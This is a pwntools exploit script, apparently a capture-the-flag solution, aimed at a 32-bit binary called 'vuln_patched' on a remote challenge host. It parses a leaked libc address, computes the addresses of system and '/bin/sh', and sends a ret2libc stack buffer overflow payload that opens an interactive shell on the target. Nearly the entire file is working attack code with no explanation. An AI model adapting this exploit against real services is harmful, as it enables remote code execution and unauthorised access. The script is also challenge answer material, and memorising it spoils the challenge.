#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 708fd55.678470.xyz --port 32127
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './vuln_patched'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '3e7db2e.678470.xyz'
port = int(args.PORT or 30681)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x0804923c
b *0x08049275
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
from pwn import p32

padding = 44

io = start()

leakedAddr = io.recv(51)[43:51].decode()
log.info("Leaked : " + leakedAddr)

baseAddr = int(leakedAddr,16) - 0x57a90 # 0x56bb0

system = 0x48170 + baseAddr
binsh = 0x1bd0d5 + baseAddr

ret = 0x08049275

pwn = b"A" * padding
pwn += p32(ret)
pwn += p32(system)
pwn += p32(0x0)
pwn += p32(binsh)

io.sendline(pwn)

io.interactive()